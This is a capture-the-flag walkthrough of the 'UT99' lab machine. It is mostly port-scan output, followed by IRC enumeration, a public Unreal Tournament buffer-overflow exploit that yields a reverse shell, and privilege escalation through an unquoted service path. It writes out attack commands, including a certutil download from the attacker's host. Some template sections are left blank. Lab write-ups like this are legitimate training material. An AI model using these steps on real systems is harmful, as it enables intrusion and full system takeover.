---
Alias: UT99
Date: 8/2/2022
Platform: Windows
Difficulty: Intermediate
Tags: #UnqoutedServicePath #PrivilegeEscalation #accesschkbinary
Status: Finished
IP: 192.168.114.44
---

# {{UT99}}


# Resolution summary
- 
- Text

## Improved skills
- skill 1
- skill 2

## Used tools
- nmap
- rustscan

---

# Information Gathering
Scanned all TCP ports:
```bash
rustscan -a 192.168.114.44 --ulimit 5000                                                                                       (master✱) 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 192.168.114.44:21
Open 192.168.114.44:80
Open 192.168.114.44:443
Open 192.168.114.44:3306
Open 192.168.114.44:6660
Open 192.168.114.44:6661
Open 192.168.114.44:6662
Open 192.168.114.44:6663
Open 192.168.114.44:6664
Open 192.168.114.44:6665
Open 192.168.114.44:6666
Open 192.168.114.44:6667
Open 192.168.114.44:6668
Open 192.168.114.44:6669
Open 192.168.114.44:6670
Open 192.168.114.44:6671
Open 192.168.114.44:6672
Open 192.168.114.44:6673
Open 192.168.114.44:6674
Open 192.168.114.44:6675
Open 192.168.114.44:6676
Open 192.168.114.44:6677
Open 192.168.114.44:6678
Open 192.168.114.44:6679
Open 192.168.114.44:6680
Open 192.168.114.44:6681
Open 192.168.114.44:6682
Open 192.168.114.44:6683
Open 192.168.114.44:6684
Open 192.168.114.44:6685
Open 192.168.114.44:6686
Open 192.168.114.44:6687
Open 192.168.114.44:6688
Open 192.168.114.44:6689
Open 192.168.114.44:6690
Open 192.168.114.44:6691
Open 192.168.114.44:6692
Open 192.168.114.44:6693
Open 192.168.114.44:6694
Open 192.168.114.44:6695
Open 192.168.114.44:6696
Open 192.168.114.44:6697
Open 192.168.114.44:6698
Open 192.168.114.44:6699
Open 192.168.114.44:6700
Open 192.168.114.44:6701
Open 192.168.114.44:6702
Open 192.168.114.44:6703
Open 192.168.114.44:6704
Open 192.168.114.44:6705
Open 192.168.114.44:6706
Open 192.168.114.44:6707
Open 192.168.114.44:6708
Open 192.168.114.44:6709
Open 192.168.114.44:6710
Open 192.168.114.44:6711
Open 192.168.114.44:6712
Open 192.168.114.44:6713
Open 192.168.114.44:6714
Open 192.168.114.44:6715
Open 192.168.114.44:6716
Open 192.168.114.44:6717
Open 192.168.114.44:6718
Open 192.168.114.44:6719
Open 192.168.114.44:6720
Open 192.168.114.44:6721
Open 192.168.114.44:6722
Open 192.168.114.44:6723
Open 192.168.114.44:6724
Open 192.168.114.44:6725
Open 192.168.114.44:6726
Open 192.168.114.44:6727
Open 192.168.114.44:6728
Open 192.168.114.44:6729
Open 192.168.114.44:6730
Open 192.168.114.44:6731
Open 192.168.114.44:6732
Open 192.168.114.44:6733
Open 192.168.114.44:6734
Open 192.168.114.44:6735
Open 192.168.114.44:6736
Open 192.168.114.44:6737
Open 192.168.114.44:6738
Open 192.168.114.44:6739
Open 192.168.114.44:6740
Open 192.168.114.44:6741
Open 192.168.114.44:6742
Open 192.168.114.44:6743
Open 192.168.114.44:6744
Open 192.168.114.44:6745
Open 192.168.114.44:6746
Open 192.168.114.44:6747
Open 192.168.114.44:6748
Open 192.168.114.44:6749
Open 192.168.114.44:6750
Open 192.168.114.44:6751
Open 192.168.114.44:6752
Open 192.168.114.44:6753
Open 192.168.114.44:6754
Open 192.168.114.44:6755
Open 192.168.114.44:6756
Open 192.168.114.44:6757
Open 192.168.114.44:6758
Open 192.168.114.44:6759
Open 192.168.114.44:6760
Open 192.168.114.44:6761
Open 192.168.114.44:6762
Open 192.168.114.44:6763
Open 192.168.114.44:6764
Open 192.168.114.44:6765
Open 192.168.114.44:6766
Open 192.168.114.44:6767
Open 192.168.114.44:6768
Open 192.168.114.44:6769
Open 192.168.114.44:6770
Open 192.168.114.44:6771
Open 192.168.114.44:6772
Open 192.168.114.44:6773
Open 192.168.114.44:6774
Open 192.168.114.44:6775
Open 192.168.114.44:6776
Open 192.168.114.44:6777
Open 192.168.114.44:6778
Open 192.168.114.44:6779
Open 192.168.114.44:6780
Open 192.168.114.44:6781
Open 192.168.114.44:6782
Open 192.168.114.44:6783
Open 192.168.114.44:6784
Open 192.168.114.44:6785
Open 192.168.114.44:6786
Open 192.168.114.44:6787
Open 192.168.114.44:6788
Open 192.168.114.44:6789
Open 192.168.114.44:6790
Open 192.168.114.44:6791
Open 192.168.114.44:6792
Open 192.168.114.44:6793
Open 192.168.114.44:6794
Open 192.168.114.44:6795
Open 192.168.114.44:6796
Open 192.168.114.44:6797
Open 192.168.114.44:6798
Open 192.168.114.44:6799
Open 192.168.114.44:6800
Open 192.168.114.44:6801
Open 192.168.114.44:6802
Open 192.168.114.44:6803
Open 192.168.114.44:6804
Open 192.168.114.44:6805
Open 192.168.114.44:6806
Open 192.168.114.44:6807
Open 192.168.114.44:6808
Open 192.168.114.44:6809
Open 192.168.114.44:6810
Open 192.168.114.44:6811
Open 192.168.114.44:6812
Open 192.168.114.44:6813
Open 192.168.114.44:6814
Open 192.168.114.44:6815
Open 192.168.114.44:6816
Open 192.168.114.44:6817
Open 192.168.114.44:6818
Open 192.168.114.44:6819
Open 192.168.114.44:6820
Open 192.168.114.44:6821
Open 192.168.114.44:6822
Open 192.168.114.44:6823
Open 192.168.114.44:6824
Open 192.168.114.44:6825
Open 192.168.114.44:6826
Open 192.168.114.44:6827
Open 192.168.114.44:6828
Open 192.168.114.44:6829
Open 192.168.114.44:6830
Open 192.168.114.44:6831
Open 192.168.114.44:6832
Open 192.168.114.44:6833
Open 192.168.114.44:6834
Open 192.168.114.44:6835
Open 192.168.114.44:6836
Open 192.168.114.44:6837
Open 192.168.114.44:6838
Open 192.168.114.44:6839
Open 192.168.114.44:6840
Open 192.168.114.44:6841
Open 192.168.114.44:6842
Open 192.168.114.44:6843
Open 192.168.114.44:6844
Open 192.168.114.44:6845
Open 192.168.114.44:6846
Open 192.168.114.44:6847
Open 192.168.114.44:6848
Open 192.168.114.44:6849
Open 192.168.114.44:6850
Open 192.168.114.44:6851
Open 192.168.114.44:6852
Open 192.168.114.44:6853
Open 192.168.114.44:6854
Open 192.168.114.44:6855
Open 192.168.114.44:6856
Open 192.168.114.44:6857
Open 192.168.114.44:6858
Open 192.168.114.44:6859
Open 192.168.114.44:6860
Open 192.168.114.44:6861
Open 192.168.114.44:6862
Open 192.168.114.44:6863
Open 192.168.114.44:6864
Open 192.168.114.44:6865
Open 192.168.114.44:6866
Open 192.168.114.44:6867
Open 192.168.114.44:6868
Open 192.168.114.44:6869
Open 192.168.114.44:6870
Open 192.168.114.44:6871
Open 192.168.114.44:6872
Open 192.168.114.44:6873
Open 192.168.114.44:6874
Open 192.168.114.44:6875
Open 192.168.114.44:6876
Open 192.168.114.44:6877
Open 192.168.114.44:6878
Open 192.168.114.44:6879
Open 192.168.114.44:6880
Open 192.168.114.44:6881
Open 192.168.114.44:6882
Open 192.168.114.44:6883
Open 192.168.114.44:6884
Open 192.168.114.44:6885
Open 192.168.114.44:6886
Open 192.168.114.44:6887
Open 192.168.114.44:6888
Open 192.168.114.44:6889
Open 192.168.114.44:6890
Open 192.168.114.44:6891
Open 192.168.114.44:6892
Open 192.168.114.44:6893
Open 192.168.114.44:6894
Open 192.168.114.44:6895
Open 192.168.114.44:6896
Open 192.168.114.44:6897
Open 192.168.114.44:6898
Open 192.168.114.44:6899
Open 192.168.114.44:6900
Open 192.168.114.44:6901
Open 192.168.114.44:6902
Open 192.168.114.44:6903
Open 192.168.114.44:6904
Open 192.168.114.44:6905
Open 192.168.114.44:6906
Open 192.168.114.44:6907
Open 192.168.114.44:6908
Open 192.168.114.44:6909
Open 192.168.114.44:6910
Open 192.168.114.44:6911
Open 192.168.114.44:6912
Open 192.168.114.44:6913
Open 192.168.114.44:6914
Open 192.168.114.44:6915
Open 192.168.114.44:6916
Open 192.168.114.44:6917
Open 192.168.114.44:6918
Open 192.168.114.44:6919
Open 192.168.114.44:6920
Open 192.168.114.44:6921
Open 192.168.114.44:6922
Open 192.168.114.44:6923
Open 192.168.114.44:6924
Open 192.168.114.44:6925
Open 192.168.114.44:6926
Open 192.168.114.44:6927
Open 192.168.114.44:6928
Open 192.168.114.44:6929
Open 192.168.114.44:6930
Open 192.168.114.44:6931
Open 192.168.114.44:6932
Open 192.168.114.44:6933
Open 192.168.114.44:6934
Open 192.168.114.44:6935
Open 192.168.114.44:6936
Open 192.168.114.44:6937
Open 192.168.114.44:6938
Open 192.168.114.44:6939
Open 192.168.114.44:6940
Open 192.168.114.44:6941
Open 192.168.114.44:6942
Open 192.168.114.44:6943
Open 192.168.114.44:6944
Open 192.168.114.44:6945
Open 192.168.114.44:6946
Open 192.168.114.44:6947
Open 192.168.114.44:6948
Open 192.168.114.44:6949
Open 192.168.114.44:6950
Open 192.168.114.44:6951
Open 192.168.114.44:6952
Open 192.168.114.44:6953
Open 192.168.114.44:6954
Open 192.168.114.44:6955
Open 192.168.114.44:6956
Open 192.168.114.44:6957
Open 192.168.114.44:6958
Open 192.168.114.44:6959
Open 192.168.114.44:6960
Open 192.168.114.44:6961
Open 192.168.114.44:6962
Open 192.168.114.44:6963
Open 192.168.114.44:6964
Open 192.168.114.44:6965
Open 192.168.114.44:6966
Open 192.168.114.44:6967
Open 192.168.114.44:6968
Open 192.168.114.44:6969
Open 192.168.114.44:6970
Open 192.168.114.44:6971
Open 192.168.114.44:6972
Open 192.168.114.44:6973
Open 192.168.114.44:6974
Open 192.168.114.44:6975
Open 192.168.114.44:6976
Open 192.168.114.44:6977
Open 192.168.114.44:6978
Open 192.168.114.44:6979
Open 192.168.114.44:6980
Open 192.168.114.44:6981
Open 192.168.114.44:6982
Open 192.168.114.44:6983
Open 192.168.114.44:6984
Open 192.168.114.44:6985
Open 192.168.114.44:6986
Open 192.168.114.44:6987
Open 192.168.114.44:6988
Open 192.168.114.44:6989
Open 192.168.114.44:6990
Open 192.168.114.44:6991
Open 192.168.114.44:6992
Open 192.168.114.44:6993
Open 192.168.114.44:6994
Open 192.168.114.44:6995
Open 192.168.114.44:6996
Open 192.168.114.44:6997
Open 192.168.114.44:6998
Open 192.168.114.44:6999
Open 192.168.114.44:7000
Open 192.168.114.44:7001
Open 192.168.114.44:7005
Open 192.168.114.44:7007
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")


# Nmap 7.92 scan initiated Sun Jul  3 00:57:52 2022 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /home/kali/Downloads/ProvingGroundsBoxes/UT99/results/192.168.114.44/scans/_quick_tcp_nmap.txt -oX /home/kali/Downloads/ProvingGroundsBoxes/UT99/results/192.168.114.44/scans/xml/_quick_tcp_nmap.xml 192.168.114.44
Nmap scan report for 192.168.114.44
Host is up, received user-set (0.083s latency).
Scanned at 2022-07-03 00:57:53 EDT for 74s
Not shown: 978 filtered tcp ports (no-response)
PORT     STATE SERVICE    REASON          VERSION
21/tcp   open  ftp        syn-ack ttl 127 FileZilla ftpd
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
80/tcp   open  http       syn-ack ttl 127 Apache httpd 2.4.16 (OpenSSL/1.0.1p PHP/5.6.12)
|_http-server-header: Apache/2.4.16 (Win32) OpenSSL/1.0.1p PHP/5.6.12
| http-methods: 
|   Supported Methods: GET HEAD POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-title: Index of /
443/tcp  open  ssl/http   syn-ack ttl 127 Apache httpd 2.4.16 (OpenSSL/1.0.1p PHP/5.6.12)
|_http-title: Bad request!
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4 4cc9 9e84 b26f 9e63 9f9e d229 dee0
| SHA-1: b023 8c54 7a90 5bfa 119c 4e8b acca eacf 3649 1ff6
| -----BEGIN CERTIFICATE-----
| MIIBnzCCAQgCCQC1x1LJh4G1AzANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDEwls
| b2NhbGhvc3QwHhcNMDkxMTEwMjM0ODQ3WhcNMTkxMTA4MjM0ODQ3WjAUMRIwEAYD
| VQQDEwlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAMEl0yfj
| 7K0Ng2pt51+adRAj4pCdoGOVjx1BmljVnGOMW3OGkHnMw9ajibh1vB6UfHxu463o
| J1wLxgxq+Q8y/rPEehAjBCspKNSq+bMvZhD4p8HNYMRrKFfjZzv3ns1IItw46kgT
| gDpAl1cMRzVGPXFimu5TnWMOZ3ooyaQ0/xntAgMBAAEwDQYJKoZIhvcNAQEFBQAD
| gYEAavHzSWz5umhfb/MnBMa5DL2VNzS+9whmmpsDGEG+uR0kM1W2GQIdVHHJTyFd
| aHXzgVJBQcWTwhp84nvHSiQTDBSaT6cQNQpvag/TaED/SEQpm0VqDFwpfFYuufBL
| vVNbLkKxbK2XwUvu0RxoLdBMC/89HqrZ0ppiONuQ+X2MtxE=
|_-----END CERTIFICATE-----
|_http-server-header: Apache/2.4.16 (Win32) OpenSSL/1.0.1p PHP/5.6.12
|_ssl-date: TLS randomness does not represent time
3306/tcp open  mysql      syn-ack ttl 127 MySQL (unauthorized)
6666/tcp open  irc        syn-ack ttl 127 InspIRCd
6667/tcp open  irc        syn-ack ttl 127 InspIRCd
6668/tcp open  irc        syn-ack ttl 127 InspIRCd
6669/tcp open  irc        syn-ack ttl 127 InspIRCd
6689/tcp open  irc        syn-ack ttl 127 InspIRCd
| irc-info: 
|   server: irc.madcowz.localdomain
|   users: 4
|   servers: 1
|   chans: 1
|   lusers: 4
|   lservers: 0
|   source ident: nmap
|   source host: 192.168.49.114
|_  error: Closing link: (nmap@192.168.49.114) [Client exited]
6692/tcp open  irc        syn-ack ttl 127 InspIRCd
6699/tcp open  irc        syn-ack ttl 127 InspIRCd
6779/tcp open  irc        syn-ack ttl 127 InspIRCd
6788/tcp open  irc        syn-ack ttl 127 InspIRCd
6789/tcp open  irc        syn-ack ttl 127 InspIRCd
6792/tcp open  irc        syn-ack ttl 127 InspIRCd
6839/tcp open  irc        syn-ack ttl 127 InspIRCd
| irc-info: 
|   server: irc.madcowz.localdomain
|   users: 2
|   servers: 1
|   chans: 1
|   lusers: 3
|   lservers: 0
|   source ident: nmap
|   source host: 192.168.49.114
|_  error: Closing link: (nmap@192.168.49.114) [Client exited]
6881/tcp open  irc        syn-ack ttl 127 InspIRCd
6901/tcp open  irc        syn-ack ttl 127 InspIRCd
6969/tcp open  irc        syn-ack ttl 127 InspIRCd
7000/tcp open  irc        syn-ack ttl 127 InspIRCd
| irc-info: 
|   server: irc.madcowz.localdomain
|   users: 3
|   servers: 1
|   chans: 1
|   lusers: 3
|   lservers: 0
|   source ident: nmap
|   source host: 192.168.49.114
|_  error: Closing link: (nmap@192.168.49.114) [Client exited]
7001/tcp open  tcpwrapped syn-ack ttl 127
7007/tcp open  irc        syn-ack ttl 127 InspIRCd
Service Info: Hosts: localhost, www.example.com, irc.madcowz.localdomain; OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jul  3 00:59:07 2022 -- 1 IP address (1 host up) scanned in 75.08 seconds
```

Enumerated open TCP ports:
```bash

```

Enumerated top 200 UDP ports:
```bash

```

---

# Enumeration

## Port 80 - Apache httpd 2.4.16 (OpenSSL/1.0.1p PHP/5.6.12)

#### -Navigated to target ip address and found the following webpage:

![](../Images/Pasted%20image%2020220703234227.png)


#### - Clicked on the "public html" link and was directed to the following web page:

![](../Images/Pasted%20image%2020220703235553.png)

![](../Images/Pasted%20image%2020220703235737.png)

#### - Clicked the "read more" link and found the following comment to join IRC:

![](../Images/Pasted%20image%2020220704000236.png)

![](../Images/Pasted%20image%2020220704000337.png)

#### - IRC Hexchat server enumeration

#### - Typed "hexchat" on my kali machine to bring up an IRC program:

#### - Clicked under "Networks" to create and label a anew network and clicked edit:

![](../Images/Pasted%20image%2020220704002124.png)

#### - Clicked in the new server box and changed it to the following "[target IP/7000]" and clicked typed enter key and close:

#### - Clicked "connect" and connected to the target machines IRC server:

![](../Images/Pasted%20image%2020220704002706.png)

#### - Clicked "open the channel list" and okay

![](../Images/Pasted%20image%2020220704004114.png)

#### - Clicked "search" and found the following "Unreal Tournament 99 Game Server" and clicked "join channel"

![](../Images/Pasted%20image%2020220704005333.png)

![](../Images/Pasted%20image%2020220704005559.png)

---

# Exploitation
## Unreal Tournament - Remote Buffer Overflow (SEH) Exploit

#### - Googled "Unreal Tournament 99 Game Server"  and found the following exploit:

![](../Images/Pasted%20image%2020220704010511.png)

![](../Images/Pasted%20image%2020220704010833.png)

#### - Downloaded the exploit on my kali machine

#### - Started a netcat listener on my kali machine listening on port 80

#### - Typed "perl 16145.pl" and found to input the following syntax:

![](../Images/Pasted%20image%2020220704011433.png)

#### - I then input the correct syntax and recieved a reverse shell:

---

# Privilege Escalation
## Local Enumeration

#### - Typed "wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """" to confirm if there were any unquoted service paths on target machine and found the following:

![](../Images/Pasted%20image%2020220706130357.png)

#UnqoutedServicePath #PrivilegeEscalation 

#### - I also verified the same unquoted service path utilizing winpeas.bat. (additionally found the service to be running with NT/Authority System):

![](../Images/Pasted%20image%2020220708005816.png)

![](../Images/Pasted%20image%2020220708005834.png)

## Privilege Escalation vector
## Unquoted Service Path

#### - Typed "certutil.exe -urlcache -split -f "http://[Kali IP]:84/accesschk.exe" on target machine to download the accesschk binary

![](../Images/Pasted%20image%2020220708010418.png)
#accesschkbinary

#### - Typed ".\accesschk /accepteula -uwdq "C:\Program Files (x86)\Foxit Software"" and confirmed we have read and write access to C:\Program Files (x86)\Foxit Software:

![](../Images/Pasted%20image%2020220708010727.png)

#### - Started a netcat listener on my kali machine listening on port 30336

#### - Typed "shutdown -r -t 10 && exit" to restart the target machine

![](../Images/Pasted%20image%2020220708010901.png)

#### - Waited a little while for the target machine to restart and received a nt authority\system shell:

![](../Images/Pasted%20image%2020220708011127.png)
---
